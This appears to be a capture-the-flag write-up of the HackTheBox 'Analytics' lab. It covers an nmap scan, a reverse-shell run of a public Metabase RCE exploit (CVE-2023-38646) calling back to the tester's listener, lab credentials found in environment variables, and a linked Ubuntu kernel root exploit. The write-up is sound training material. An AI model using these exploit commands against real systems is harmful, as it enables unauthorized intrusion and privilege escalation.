---
title: "Analytics - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Analytics
![](https://kar0nx.github.io/assets/images/writeup/f86fcf4c1cfcc690b43f43e100f89718.png)
## Reconnaissance

IP: 10.10.11.233
## NMAP

```
nmap -T4 -p- -A 10.10.11.233
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 11:16 UTC
Nmap scan report for analytics.htb (10.10.11.233)
Host is up (0.030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   29.66 ms 10.10.14.1
2   30.11 ms analytics.htb (10.10.11.233)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds

```

## Website
### Site

After adding to /etc/hosts analytical.htb we got:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829132028.png)

after clicking login we are redirected to data.analytical.htb (add to /etc/hosts) and we see login panel:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829132345.png)

## Gaining Access

Tried to login with default credentials/ common ones but no hit so I searched for Metabase exploit in google and I found preauthenticated RCE
https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=34306
PoC: https://github.com/securezeron/CVE-2023-38646

```
python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost 10.10.14.8 --lport 4444
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829133517.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829133455.png)

In env we can find credentials user and passsword (linpeas didn't detect it or I do sth wrong)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829135739.png)

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

We are able to login via ssh and get user flag.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829135944.png)

## Privilege escalation

Linpeas found that kernel is outdated, so let's search for kernel exploits:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829140216.png)

searching google I found reddit article about This exploit 
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/
and PoC on github: https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

download exploit in machine and run to get root access:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250829142133.png)
